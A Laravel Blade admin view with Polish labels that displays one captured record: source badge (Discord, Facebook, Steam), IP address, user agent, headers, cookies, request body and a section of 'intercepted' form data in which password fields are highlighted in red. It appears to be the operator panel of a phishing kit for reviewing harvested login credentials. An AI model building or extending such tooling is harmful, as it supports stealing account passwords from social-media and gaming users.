<div class="space-y-4 p-2 font-mono text-sm">

    {{-- Header --}}
    <div class="flex items-center gap-3 pb-3 border-b border-gray-200 dark:border-gray-700">
        <span class="px-2 py-0.5 rounded text-xs font-bold uppercase
            {{ match($record->source) {
                'discord'  => 'bg-indigo-100 text-indigo-800 dark:bg-indigo-900 dark:text-indigo-300',
                'facebook' => 'bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300',
                'steam'    => 'bg-teal-100 text-teal-800 dark:bg-teal-900 dark:text-teal-300',
                default    => 'bg-gray-100 text-gray-800 dark:bg-gray-700 dark:text-gray-300',
            } }}">
            {{ strtoupper($record->source) }}
        </span>
        <span class="text-gray-500 text-xs">{{ $record->created_at->format('d.m.Y H:i:s') }}</span>
        <span class="ml-auto text-gray-400 text-xs">#{{ $record->id }}</span>
    </div>

    {{-- Network Info --}}
    <div class="grid grid-cols-2 gap-3">
        <div class="bg-gray-50 dark:bg-gray-800 rounded p-3">
            <div class="text-xs text-gray-400 uppercase mb-1">IP Adres</div>
            <div class="text-green-400 font-bold">{{ $record->ip_address ?? '—' }}</div>
        </div>
        <div class="bg-gray-50 dark:bg-gray-800 rounded p-3">
            <div class="text-xs text-gray-400 uppercase mb-1">Metoda</div>
            <div class="text-yellow-400 font-bold">{{ $record->request_method }}</div>
        </div>
        <div class="bg-gray-50 dark:bg-gray-800 rounded p-3 col-span-2">
            <div class="text-xs text-gray-400 uppercase mb-1">URL Źródłowy</div>
            <div class="text-cyan-400 break-all">{{ $record->request_url ?? '—' }}</div>
        </div>
        <div class="bg-gray-50 dark:bg-gray-800 rounded p-3 col-span-2">
            <div class="text-xs text-gray-400 uppercase mb-1">Referer</div>
            <div class="text-gray-300 break-all">{{ $record->referer ?? '—' }}</div>
        </div>
        <div class="bg-gray-50 dark:bg-gray-800 rounded p-3 col-span-2">
            <div class="text-xs text-gray-400 uppercase mb-1">User-Agent</div>
            <div class="text-gray-300 break-all text-xs">{{ $record->user_agent ?? '—' }}</div>
        </div>
    </div>

    {{-- Payload —przechwycone dane z formularza --}}
    <div>
        <div class="text-xs text-red-400 uppercase font-bold mb-2 flex items-center gap-2">
            <span>🔑 Przechwycone Dane (Payload)</span>
        </div>
        @if(!empty($record->payload))
            <div class="bg-black rounded p-3 space-y-1">
                @foreach($record->payload as $key => $value)
                    <div class="flex gap-3">
                        <span class="text-cyan-400 min-w-[140px]">{{ $key }}:</span>
                        <span class="{{ str_contains(strtolower($key), 'password') || str_contains(strtolower($key), 'pass') || str_contains(strtolower($key), 'haslo') ? 'text-red-400 font-bold' : 'text-green-300' }}">
                            {{ is_array($value) ? json_encode($value) : $value }}
                        </span>
                    </div>
                @endforeach
            </div>
        @else
            <div class="text-gray-500 italic">Brak danych payloadu.</div>
        @endif
    </div>

    {{-- HTTP Headers --}}
    <div>
        <div class="text-xs text-gray-400 uppercase font-bold mb-2">HTTP Headers</div>
        @if(!empty($record->headers))
            <div class="bg-black rounded p-3 space-y-1 max-h-48 overflow-y-auto">
                @foreach($record->headers as $key => $values)
                    <div class="flex gap-3 text-xs">
                        <span class="text-yellow-400 min-w-[180px]">{{ $key }}:</span>
                        <span class="text-gray-300">{{ is_array($values) ? implode(', ', $values) : $values }}</span>
                    </div>
                @endforeach
            </div>
        @else
            <div class="text-gray-500 italic">Brak nagłówków.</div>
        @endif
    </div>

    {{-- Cookies metadata --}}
    <div>
        <div class="text-xs text-gray-400 uppercase font-bold mb-2">Cookies metadata</div>
        @if(!empty($record->cookie_metadata))
            <pre class="bg-black rounded p-3 text-xs text-gray-300 max-h-48 overflow-y-auto whitespace-pre-wrap break-words">{{ json_encode($record->cookie_metadata, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) }}</pre>
        @else
            <div class="text-gray-500 italic">Brak metadanych cookies.</div>
        @endif
    </div>

    {{-- Request body --}}
    <div>
        <div class="text-xs text-gray-400 uppercase font-bold mb-2">Body requestu</div>
        @if(!empty($record->request_body))
            <pre class="bg-black rounded p-3 text-xs text-gray-300 max-h-64 overflow-y-auto whitespace-pre-wrap break-words">{{ json_encode($record->request_body, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) }}</pre>
        @else
            <div class="text-gray-500 italic">Brak zapisanego body.</div>
        @endif
    </div>

</div>
